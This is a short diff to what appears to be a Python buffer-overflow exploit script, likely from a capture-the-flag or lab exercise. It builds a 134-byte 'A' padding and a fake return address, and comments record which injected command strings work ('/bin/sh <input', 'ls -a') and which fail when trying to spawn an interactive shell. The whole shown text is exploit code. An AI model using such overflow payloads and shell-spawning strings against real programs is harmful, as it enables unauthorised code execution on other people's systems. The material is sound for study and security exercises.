@@ -4,9 +4,14 @@ import sys
 
 oflow = b'A' * 134
 
+# following works
 #string = b"ls -a\0"
+#string = b"/bin/sh <input\0"
+
+# following doesn't work
 #string = b"open(\"/dev/tty\", O_RDWR|O_NOCTTY|O_TRUNC|O_APPEND|O_ASYNC) && /bin/sh\0"
-string = b"/bin/sh <input\0"
+#string = b"/bin/sh -c \"cat /proc/self/fd/0\"\0"
+#string = b"/bin/sh | cat\0"
 
 fakeret = b'\xef\xbe\xad\xde'
 
